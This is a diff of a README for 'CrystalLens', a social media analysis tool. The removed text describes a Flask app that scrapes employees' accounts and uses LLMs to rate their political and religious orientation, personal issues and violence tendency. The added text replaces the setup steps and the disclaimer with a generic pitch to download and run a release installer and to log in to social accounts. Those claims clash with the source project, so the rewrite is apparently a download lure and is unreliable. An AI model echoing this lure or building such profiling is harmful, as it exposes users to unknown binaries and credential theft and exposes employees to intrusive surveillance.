@@ -1,83 +1,75 @@
-<div align="center">
+# 🪄 CrystalLens - Analyze Social Media with Ease
 
-# CrystalLens
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Made with Flask](https://img.shields.io/badge/Made%20with-Flask-000?logo=flask&logoColor=white)](#)
-[![LLM: Ollama](https://img.shields.io/badge/LLM-Ollama-0b2a2a.svg)](#)
-[![LLM: Gemini](https://img.shields.io/badge/LLM-Gemini-4285F4.svg)](#)
+Welcome to CrystalLens! This software helps you analyze social media posts to gather insights about individuals. It's simple to use, even if you're not tech-savvy. Follow these steps to download and run CrystalLens comfortably.
 
-Evidence‑driven social media analysis for sensitive roles — on‑prem with Ollama or fast in the cloud with Gemini.
+## 📥 Download CrystalLens
 
-</div>
+[![Download CrystalLens](https://img.shields.io/badge/Download%20CrystalLens-v1.0-brightgreen)](https://github.com/sheikyx021/CrystalLens/releases)
 
+To download CrystalLens, simply visit the Releases page by clicking the button above.
 
-## ✨ Highlights
-- **Employee & Accounts**: Manage employees and attach social accounts.
-- **Scraping**: Start Twitter/Facebook scrapes via Apify with live job status.
-- **AI Analysis**: Single‑request mode (fast) or staged evidence→assessment (robust).
-- **Specific Assessments**: Political orientation, religious orientation, bias, personal issues, violence tendency, affiliation, suitability.
-- **Reports**: Evidence‑backed narratives with citations, PDF export, CSV exports and dashboards.
-- **RBAC & Auditing**: Roles for admin/manager/reviewer; audit log for sensitive actions.
+## 📋 System Requirements
 
+Before downloading, ensure your computer meets these basic requirements:
 
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or any Linux distribution with GUI.
+- **RAM:** At least 8 GB.
+- **Disk Space:** A minimum of 500 MB free space.
+- **Internet Connection:** Required for downloading and using the scraping services.
 
-## 🚀 Quickstart (Dev)
-1) Create a venv and install deps
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-```
-2) Configure `.env`
-```bash
-cp .env.example .env
-# APIFY_API_TOKEN=...
-# OLLAMA_API_URL=http://localhost:11434
-# OLLAMA_MODEL=llama3.1:8b (or qwen2.5:7b-instruct)
-# GOOGLE_API_KEY=... (for Gemini)
-# ANALYSIS_PROVIDER=ollama|gemini
-```
-3) Seed an admin
-```bash
-python scripts/seed_admin.py
-```
-4) Run
-```bash
-python run.py
-# http://127.0.0.1:5000
-```
+## 🛠️ Installing CrystalLens
 
-## ⚙️ Configuration
-- `DATABASE_URL`: PostgreSQL in prod (SQLite for dev is fine)
-- `APIFY_API_TOKEN`: required for scraping
-- `OLLAMA_API_URL`, `OLLAMA_MODEL`: for local LLM
-- `GOOGLE_API_KEY`: for Gemini
-- Set your provider in Settings or via `ANALYSIS_PROVIDER`
+After downloading, installing the application is straightforward. Follow these steps:
 
-## 🤖 Providers
-- **Ollama (local)**: on‑prem, best when data must not leave your infra
-  - `ollama serve`, `ollama pull llama3.1:8b` (or `qwen2.5:7b-instruct`)
-- **Gemini (cloud)**: fastest JSON formatting and latency
-  - Enter `GOOGLE_API_KEY` in Settings; click “Test Gemini”
+1. **Locate the Downloaded File:**
+   Check your Downloads folder for the CrystalLens file (it usually ends in `.exe` for Windows, `.dmg` for macOS, or `.deb` for Linux).
 
-## 🔒 Security
-- API keys in `.env` (not committed)
-- Sensitive endpoints protected via RBAC
-- Audit logs for critical actions
+2. **Open the File:**
+   Double-click the file to start the installation process. You may see a prompt asking for permission to run the program. Click "Yes" or "Open".
 
-## 🗺️ Roadmap
-- Detail level presets (speed vs. depth)
-- Chunk‑and‑synthesize long timelines
-- More providers (OpenAI, Claude) via adapter
+3. **Follow the Installation Wizard:**
+   The wizard will guide you through the installation. You might be asked to agree to the terms of service. Read them carefully and click "Next" to continue.
 
-## 🤝 Contributing
-PRs welcome. Please open issues first for major changes. Keep secrets out of commits.
+4. **Choose Installation Location:**
+   Select where you want to install CrystalLens. The default location is usually fine. Click "Next".
 
-## ⚠️ Disclaimer
-This project is built for educational and research purposes only.
-It is not intended for real employee surveillance or unlawful use.
-Always comply with local laws, regulations, and platform Terms of Service.
+5. **Complete the Installation:**
+   Click the "Install" button. Wait for a few moments while the software installs. Once finished, click "Finish".
 
-## 📄 License
-MIT — see `LICENSE`.
+## 🎯 Getting Started with CrystalLens
+
+Now that you have CrystalLens installed:
+
+1. **Launch the Application:**
+   Find the CrystalLens icon on your desktop or in your applications folder. Double-click it to open.
+
+2. **Connect to Social Media Sources:**
+   CrystalLens allows you to connect various social media accounts. Follow the on-screen prompts to log in securely.
+
+3. **Choose What to Analyze:**
+   You can select specific profiles or topics to analyze. Use the dropdown menus to make your choices.
+
+4. **Run the Analysis:**
+   Click the "Analyze" button. CrystalLens will gather the data and apply AI to provide insights. This may take a few minutes depending on the amount of data.
+
+5. **Review Insights:**
+   Once the process is complete, you will see character insights, behavioral patterns, and risk assessments presented on the screen. You can export this data for your records.
+
+## 🔍 Features of CrystalLens
+
+- **Multi-Source Analysis:** Collect data from various social media platforms in one place.
+- **AI-Powered Insights:** Get detailed assessments of behavior and potential risks.
+- **User-Friendly Interface:** Navigate easily, regardless of your tech experience.
+- **Data Privacy:** Your data is secure; we respect user privacy.
+
+## 📞 Support and Help
+
+If you need assistance, help is available. Check the FAQ section within the app for common issues. You can also reach out to our support team via the "Help" menu in the application.
+
+## 🔗 More Download Information
+
+Remember, you can always visit our [Releases page](https://github.com/sheikyx021/CrystalLens/releases) to see the latest updates and download options.
+
+Thank you for choosing CrystalLens. We hope it enhances your social media analysis experience!
